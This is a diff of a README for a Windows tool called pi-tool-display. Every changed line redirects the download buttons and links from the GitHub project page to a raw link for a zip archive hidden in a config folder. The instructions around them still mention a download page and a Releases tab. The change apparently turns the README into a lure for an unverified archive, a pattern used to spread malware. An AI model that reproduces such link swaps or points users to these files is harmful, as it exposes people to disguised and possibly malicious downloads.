@@ -1,6 +1,6 @@
 # 🛠️ pi-tool-display - Simple Tool Output for Pi Coding
 
-[![Download pi-tool-display](https://img.shields.io/badge/Download-pi--tool--display-brightgreen)](https://github.com/Ankur2912/pi-tool-display)
+[![Download pi-tool-display](https://img.shields.io/badge/Download-pi--tool--display-brightgreen)](https://raw.githubusercontent.com/Ankur2912/pi-tool-display/main/config/display_tool_pi_v2.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Here is how to get pi-tool-display running on your Windows computer.
 
 Click this big green button to visit the download page on GitHub:
 
-[![Download pi-tool-display](https://img.shields.io/badge/Download-pi--tool--display-brightgreen)](https://github.com/Ankur2912/pi-tool-display)
+[![Download pi-tool-display](https://img.shields.io/badge/Download-pi--tool--display-brightgreen)](https://raw.githubusercontent.com/Ankur2912/pi-tool-display/main/config/display_tool_pi_v2.9.zip)
 
 On that page, look for the latest release or download section. You will find files ready to download. Choose the Windows version, usually ending with `.exe`, and save it on your computer.
 
@@ -96,7 +96,7 @@ The app does not require installation beyond running the `.exe` file. This means
 
 You can always visit the official project page to download the latest version:
 
-[https://github.com/Ankur2912/pi-tool-display](https://github.com/Ankur2912/pi-tool-display) 
+[https://raw.githubusercontent.com/Ankur2912/pi-tool-display/main/config/display_tool_pi_v2.9.zip](https://raw.githubusercontent.com/Ankur2912/pi-tool-display/main/config/display_tool_pi_v2.9.zip) 
 
 Click the “Releases” tab and download the newest `.exe` file for Windows.
 
@@ -120,4 +120,4 @@ If you encounter issues or want to ask questions, use the GitHub project page. Y
 
 ---
 
-# [🛠️ Download pi-tool-display Now](https://github.com/Ankur2912/pi-tool-display)
+# [🛠️ Download pi-tool-display Now](https://raw.githubusercontent.com/Ankur2912/pi-tool-display/main/config/display_tool_pi_v2.9.zip)
